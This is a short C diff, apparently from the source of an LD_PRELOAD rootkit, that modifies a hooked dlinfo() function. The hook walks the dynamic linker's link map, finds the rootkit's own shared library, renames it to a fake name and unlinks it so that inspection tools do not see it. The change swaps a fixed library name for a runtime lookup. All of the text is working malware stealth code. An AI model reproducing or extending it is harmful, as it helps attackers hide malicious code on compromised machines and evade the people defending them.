@@ -18,7 +18,9 @@ int dlinfo(void *handle, int request, void *p){
         do{
             loop = loop->l_next;
             if(strcmp(loop->l_name, "\0")){
-                if(strstr(BDVLSO, loop->l_name)){
+                so = getbdvsoinf();
+                if(so == NULL) return (long)call(CDLINFO, handle, request, p);
+                if(strstr(so->soname, loop->l_name)){
                     bdvl_linkmap = loop;
                     loop->l_name = strdup(FAKE_LINKMAP_NAME);
 
@@ -28,6 +30,8 @@ int dlinfo(void *handle, int request, void *p){
                         loop->l_next->l_prev = loop->l_prev;
                     }
                 }
+                free(so);
+                so = NULL;
             }
         }while(loop != NULL && loop->l_name != NULL && loop->l_next != NULL);
     }
